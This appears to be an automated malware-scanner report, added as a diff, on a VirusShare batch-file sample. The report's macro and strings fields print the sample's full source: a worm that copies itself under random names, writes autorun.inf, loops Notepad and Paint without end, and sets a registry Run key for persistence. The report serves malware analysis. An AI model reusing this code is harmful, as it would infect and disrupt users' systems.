@@ -1,0 +1,75 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "open": "May open a file"
+        },
+        "macro": "@echo off\ncopy %0 c:\\hally.bat\nif exist c:\\autorun.inf\nexit\nif not exist c:\\autorun.inf\necho [autorun] >> c:\\autorun.inf\necho open plap.bat >> c:\\autorun.inf\necho open hally.bat >> c:\\autorun.inf\ngoto makeplap\n\n:makeplap\necho :lookyloopy >> c:\\plap.bat\necho start notepad >> c:\\plap.bat\necho start mspaint >> c:\\plap.bat\necho goto lookyloopy >> c:\\plap.bat\ngoto makemyself\n\n:makemyself\ncopy %0 %SystemRoot%\\MSDOS_3.bat\n\n:chekexist\nif exist c:\\hally.bat\nexit\nif not exist c:\\hally.bat\ncopy %0 c:\\hally.bat\ngoto randomnames\n\n:randomnames\ncopy %0 %SystemRoot%\\%random%.bat\ncopy %0 %Windir%\\%random%.bat\ncopy %0 %programfilesdir%\\%random%\\%random%.bat\ncopy %0 %homepath%\\%random%\\%random%.bat\ncopy %0 %homepaht%\\%random%.bat\ngoto startup\n\n:startup\necho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >> %programfilesdir%\\any.reg\necho \"MSDOS Shell\"=\"c:\\hally.bat\" >> c:\\any.reg\nstart regedit /s %programfilesdir%\\any.reg\nexit\n"
+    },
+    "filename": "VirusShare_2a78531ee21769e3c59bc0cdaf46dbbb",
+    "filesize": 983,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2a78531ee21769e3c59bc0cdaf46dbbb",
+        "sha1": "fa9c226daf1ff02189bf1c23a7f33ad5a3246564",
+        "sha256": "f0c105e5849f411e6c0574f4ab6175f90c3a9b2adf958de2a1060430dc329ae4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "copy %0 c:\\hally.bat",
+            "if exist c:\\autorun.inf",
+            "exit",
+            "if not exist c:\\autorun.inf",
+            "echo [autorun] >> c:\\autorun.inf",
+            "echo open plap.bat >> c:\\autorun.inf",
+            "echo open hally.bat >> c:\\autorun.inf",
+            "goto makeplap",
+            ":makeplap",
+            "echo :lookyloopy >> c:\\plap.bat",
+            "echo start notepad >> c:\\plap.bat",
+            "echo start mspaint >> c:\\plap.bat",
+            "echo goto lookyloopy >> c:\\plap.bat",
+            "goto makemyself",
+            ":makemyself",
+            "copy %0 %SystemRoot%\\MSDOS_3.bat",
+            ":chekexist",
+            "if exist c:\\hally.bat",
+            "exit",
+            "if not exist c:\\hally.bat",
+            "copy %0 c:\\hally.bat",
+            "goto randomnames",
+            ":randomnames",
+            "copy %0 %SystemRoot%\\%random%.bat",
+            "copy %0 %Windir%\\%random%.bat",
+            "copy %0 %programfilesdir%\\%random%\\%random%.bat",
+            "copy %0 %homepath%\\%random%\\%random%.bat",
+            "copy %0 %homepaht%\\%random%.bat",
+            "goto startup",
+            ":startup",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >> %programfilesdir%\\any.reg",
+            "echo \"MSDOS Shell\"=\"c:\\hally.bat\" >> c:\\any.reg",
+            "start regedit /s %programfilesdir%\\any.reg",
+            "exit"
+        ],
+        "file": {
+            "echo \"MSDOS Shell\"=\"c:\\hally.bat\" >> c:\\any.reg": "Registry",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run] >> %programfilesdir%\\any.reg": "Registry",
+            "start regedit /s %programfilesdir%\\any.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266300",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
